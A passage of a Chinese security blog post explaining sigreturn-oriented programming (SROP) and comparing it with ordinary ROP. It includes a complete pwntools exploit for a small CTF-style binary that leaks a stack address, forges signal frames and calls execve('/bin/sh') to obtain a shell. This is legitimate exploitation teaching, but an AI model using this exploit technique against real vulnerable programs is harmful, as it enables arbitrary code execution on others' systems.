+<p>如果栈溢出的数据可以覆盖它的话，就可以进行伪造，欺骗程序</p>
+<hr>
+<h2 id="深入理解SROP"><a href="#深入理解SROP" class="headerlink" title="深入理解SROP"></a>深入理解SROP</h2><p>先看一个例子：（通过修改Signal Frame来控制syscall）</p>
+<img src="/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/1640706807303.png" class width="1640706807303"> 
+<p>伪造 <strong>rdi</strong> 为“/bin/sh”，伪造 <strong>rip</strong> 为syscall，伪造 <strong>rax</strong> 为“59”（execve）</p>
+<p>这样的话，程序在结束signal handler，执行<strong>sigreturn</strong>的时候，就可以控制 <strong>rip</strong> 指向syscall，然后根据调用号 “59” 执行系统调用execve</p>
+<p>当然也可以伪造“syscall；ret”形成<strong>system call chains</strong>：</p>
+<img src="/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/1640707274321.png" class width="1640707274321"> 
+<p>syscall执行完成过后，就可以通过ret控制ip指针指向栈顶元素（类似于gadgets）</p>
+<p>SROP需要以下条件：</p>
+<ol>
+<li>攻击者可以通过stack overflow等漏洞控制栈上的内容</li>
+<li>需要知道栈的地址（比如需要知道自己构造的字符串<code>/bin/sh</code>的地址）</li>
+<li>需要知道<code>syscall</code>指令在内存中的地址</li>
+<li>需要知道<code>sigreturn</code>系统调用的内存地址</li>
+</ol>
+<p>接着我们就看一下那道设计巧妙的题目吧：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *retaddr; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sys_read(<span class="number">0</span>, &amp;retaddr, <span class="number">0x400</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004000B</span>0 ; <span class="function"><span class="keyword">signed</span> __int64 <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function">.text:00000000004000B0                 <span class="keyword">public</span> start</span></span><br><span class="line"><span class="function">.text:00000000004000B0 start           proc near               </span>; DATA XREF: LOAD:<span class="number">0000000000400018</span>↑o</span><br><span class="line">.text:<span class="number">00000000004000B</span>0                 <span class="keyword">xor</span>     rax, rax</span><br><span class="line">.text:<span class="number">00000000004000B</span>3                 mov     edx, <span class="number">400</span>h       ; count</span><br><span class="line">.text:<span class="number">00000000004000B</span>8                 mov     rsi, rsp        ; buf</span><br><span class="line">.text:<span class="number">00000000004000B</span>B                 mov     rdi, rax        ; fd</span><br><span class="line">.text:<span class="number">00000000004000B</span>E                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:<span class="number">00000000004000</span>C0                 retn</span><br><span class="line">.text:<span class="number">00000000004000</span>C0 start           endp</span><br><span class="line">.text:<span class="number">00000000004000</span>C0</span><br><span class="line">.text:<span class="number">00000000004000</span>C0 _text           ends</span><br></pre></td></tr></table></figure>
+<p>原汇编代码就相当于<strong>“read（rax，rsp，0x400）”</strong>，直接在栈顶写入数据</p>
+<p>​        //注意：read的写入的位置并不是<strong>真正的</strong>rsp，而是对rsi进行赋值时的rsp指向的位置，所以syscall构建栈帧来保存上下文的过程不会受read的影响</p>
+<p>源程序就是用汇编写的，只有一个函数，程序使用statically（没有got表）</p>
+<p>经过分析可以发现3个问题：</p>
+<p>问题一，没有“/bin/sh”：</p>
+<p>本程序没有“/bin/sh”，所以需要用“read”在某个地址上写入“/bin/sh”</p>
+<p>栈地址是不确定的，所以需要用“write”泄露用于写入“/bin/sh”栈地址</p>
+<p>问题二，怎么修改rax：</p>
+<p>想要syscall调用“write”，必须先要把rax填入“1”，而寄存器和栈空间完全就是两个东西，那么这么通过栈来控制寄存器呢？</p>
+<p>整个程序就只有一个“syscall”函数，它第一次执行时调用“read”，而“read”的返回值就装在“rax”中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、如果读取成功，则返回实际读到的字节数。这里又有两种情况：一是如果在读完count要求字节之前已经到达文件的末尾，那么实际返回的字节数将小于count值，但是仍然大于<span class="number">0</span>；二是在读完count要求字节之前，仍然没有到达文件的末尾，这是实际返回的字节数等于要求的count值。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、如果读取时已经到达文件的末尾，则返回<span class="number">0</span>。</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、如果出错，则返回－<span class="number">1</span>。</span><br></pre></td></tr></table></figure>
+<p>那么，先要rax为“1”，函数“read”的实际写入长度必须为“1”</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004000B</span>0                 <span class="keyword">xor</span>     rax, rax</span><br></pre></td></tr></table></figure>
+<p>而且这段汇编代码会把rax中的值改为“0”，所以必须让过……</p>
+<p>所以“send(‘\xb3’)”是最佳选择，覆盖“0x4000B0”最后一字节为“0xb3”，跳过了它，并且长度为“1”</p>
+<p>接下来就会执行<strong>“write（1，rsp，0x400）”</strong>，泄露stack_addr</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">start_addr = <span class="number">0x00000000004000B0</span></span><br><span class="line">payload = p64(start_addr) * <span class="number">3</span> <span class="comment">#start_addr压栈3次，程序总共会执行4次</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(<span class="string">&#x27;\xb3&#x27;</span>)</span><br><span class="line">stack_addr = u64(sh.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">log.success(<span class="string">&#x27;leak stack addr :&#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure>
+<img src="/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/1640529781412.png" class width="1640529781412"> 
+<p>第一次read时：在rsp写入“4000B0” * 3，同时read返回时“pop”掉一个，程序返回到“start_addr” </p>
+<img src="/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/1640529918052.png" class width="1640529918052"> 
+<p>第二次read时：在rsp写入“\xb3”，改写rsp为“0x4000B3”，程序返回到“start_addr+1”</p>
+<p>第三次就直接执行write了</p>
+<p>问题三，SROP到底怎么利用：</p>
+<p>其实pwntool中有专门用来攻击<strong>srop</strong>的工具：<strong>SigreturnFrame</strong></p>
+<p>和ROP模块一样，可以自动获取程序中的gadgets</p>
+<p>完整exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">small = ELF(<span class="string">&#x27;./SROP&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./SROP&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">syscall_ret = <span class="number">0x00000000004000BE</span></span><br><span class="line">start_addr = <span class="number">0x00000000004000B0</span></span><br><span class="line">payload = p64(start_addr) * <span class="number">3</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">&#x27;\xb3&#x27;</span>)</span><br><span class="line">stack_addr = u64(sh.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">log.success(<span class="string">&#x27;leak stack addr :&#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line"><span class="comment">#SigreturnFrame模块，触发条件：只要rt_sigreturn的时候栈顶是SigreturnFrame就行</span></span><br><span class="line">sigframe.rax = constants.SYS_read	 	 <span class="comment">#控制rax为‘read’的调用号</span></span><br><span class="line">sigframe.rdi = <span class="number">0</span>				 <span class="comment">#控制各个参数</span></span><br><span class="line">sigframe.rsi = stack_addr			 </span><br><span class="line">sigframe.rdx = <span class="number">0x400</span>				 </span><br><span class="line">sigframe.rsp = stack_addr			 <span class="comment">#控制rsp为stack_addr（栈转移）</span></span><br><span class="line">sigframe.rip = syscall_ret			 <span class="comment">#控制rip为syscall_ret（但只会执行ret）</span></span><br><span class="line">payload = p64(start_addr) + <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + <span class="built_in">str</span>(sigframe)<span class="comment">#构建signal frame（SYS_read）</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sigreturn = p64(syscall_ret) + <span class="string">&#x27;b&#x27;</span> * <span class="number">7</span><span class="comment">#读入15个字符，read控制rax为15</span></span><br><span class="line">sh.send(sigreturn)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">程序在识别到syscall后，首先构建新的栈帧保存上下文，然后调用sys_read在原来的栈空间中写入payload，sys_read执行完成后会ret栈顶的sigreturn，把新构建的栈帧pop出来，接着在程序最后执行的ret会控制IP指向‘start_addr’，然后程序重新执行</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">重复上述操作，在栈空间中压入‘syscall_ret’（因为ret会使rsp+8，所以‘syscall_ret’其实写入了&#x27;aaaaaaaa&#x27;的位置），并在最后一个ret的时候控制IP指向它</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">程序在识别到syscall后，发现rax为15所以执行sigreturn，并且其后正好就是sigframe满足了SigreturnFrame模块的条件（即使sigframe被&#x27;bbbbbbb&#x27;覆盖了一部分也不影响），sigreturn会根据sigframe来设置寄存器的值，控制IP指向syscall_ret，执行sys_read（伪）</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + <span class="number">0x120</span>  </span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = p64(start_addr) + <span class="string">&#x27;c&#x27;</span> * <span class="number">8</span> + <span class="built_in">str</span>(sigframe)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(frame_payload)</span><br><span class="line">payload = frame_payload + (<span class="number">0x120</span> - <span class="built_in">len</span>(frame_payload)) * <span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"><span class="comment">#通过SYS_read在stack_addr+0x120写入&#x27;/bin/sh\x00&#x27;，顺便构建signal frame（SYS_execve）</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(sigreturn)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">在之前的操作中已经更换了寄存器的数据，所以payload会被写入‘stack_addr’，在‘stack_addr’之中构建sigframe并且在‘stack_addr + 0x120’中写入&#x27;/bin/sh\x00&#x27;，在sys_read（伪）结束以后的ret会控制IP指向‘start_addr’</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">重新执行程序后，寄存器&#x27;rax,rdi,rsi,rdx&#x27;被重置，因为‘start_addr’被pop出栈，所以sigreturn会写入&#x27;cccccccc&#x27;的位置，和上文一样了，SigreturnFrame模块的条件满足</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>总结：</p>
+<p><strong>SROP</strong>的实现很大程度上依靠SigreturnFrame模块，使用这个模块只需要保证sigreturn执行时的栈顶是SigreturnFrame就可以了</p>
+<p>所以需要先构建signal frame，然后再合适的时机调用sigreturn</p>
+<p>syscall本身压栈的sigreturn难以被利用，所以我们常常改写“rax”为“15”，以<strong>主动调用</strong>sigreturn，比如：通过read函数的返回值改写“rax”，通过“pop rax”指令来改写“rax”</p>
+<p><strong>SROP</strong>也较为灵活，因为可以改写的寄存器很多，栈转移等操作都可以在SROP的附庸中实现</p>
+<p>扩展：<a target="_blank" rel="noopener" href="https://2cto.com/article/201512/452080.html">https://2cto.com/article/201512/452080.html</a></p>
+<hr>
+<h2 id="SROP和传统ROP的对比"><a href="#SROP和传统ROP的对比" class="headerlink" title="SROP和传统ROP的对比"></a>SROP和传统ROP的对比</h2><p><strong>一般ROP</strong></p>
+<p>ROP的攻击方式比较普遍，安全防护相应的也比较多 </p>
+<p>ROP极大的依赖于栈结构，gadgets片段都是保存在stack上，所以在一次利用结束后，在stack发生改变的时候，很难再次利用 </p>
+<p><strong>SROP和攻击</strong></p>
+<p>采用SROP进行攻击，需要的gadgets少</p>
+<p>每次只需要伪造对应的Frame，sigreturn的调用都能够强制切换到我们需要的状态，有着极高的代码复用性 </p>
+<p><strong>两者对比</strong></p>
+<p>综合考虑，SROP明显优于ROP，首先SROP是需要利用的gadgets比ROP少，接着就是代码复用性高，只要有syscall随时都可以控制程序执行系统调用，而ROP还需要考虑程序中是否有现成的system函数，如果没有，则需要通过DynELF，LibcSearcher等各种方法到libc中获取system</p>
+<p>但SROP的普遍性却不如ROP，SROP需要syscall，如果程序中压根就没有syscall当然就用不了SROP，并且伪造Signal Frame需要相当长的栈空间（至少248字节），如果栈溢出的字节数过少也用不了SROP（SROP的条件非常苛刻）</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/stack/" rel="tag"><i class="fa fa-tag"></i> stack</a>
+              <a href="/tags/SROP/" rel="tag"><i class="fa fa-tag"></i> SROP</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" rel="prev" title="dl_runtime_resolve源码分析">
+      <i class="fa fa-chevron-left"></i> dl_runtime_resolve源码分析
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/01/01/%E8%A7%A3%E6%9E%90pwn%E9%A2%98%E4%B8%AD%E9%99%84%E5%B8%A6%E7%9A%84%E6%96%87%E4%BB%B6/" rel="next" title="解析pwn题中附带的文件（持续更新）">
+      解析pwn题中附带的文件（持续更新） <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SignalFrame%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">SignalFrame分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80-%E4%B8%AD%E6%96%AD%E6%B5%81%E7%A8%8B-amp-%E5%88%86%E7%B1%BB"><span class="nav-number">2.</span> <span class="nav-text">前言-中断流程&amp;分类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">前言-系统调用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E6%9E%90Signal%E6%9C%BA%E5%88%B6"><span class="nav-number">4.</span> <span class="nav-text">简析Signal机制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E6%9E%90ucontext-amp-siginfo"><span class="nav-number">5.</span> <span class="nav-text">简析ucontext &amp; siginfo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E6%9E%90Signal-Frame"><span class="nav-number">6.</span> <span class="nav-text">简析Signal Frame</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3SROP"><span class="nav-number">7.</span> <span class="nav-text">深入理解SROP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SROP%E5%92%8C%E4%BC%A0%E7%BB%9FROP%E7%9A%84%E5%AF%B9%E6%AF%94"><span class="nav-number">8.</span> <span class="nav-text">SROP和传统ROP的对比</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yhellow"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">yhellow</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">113</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">79</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yhellow</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">1.5m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">22:58</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
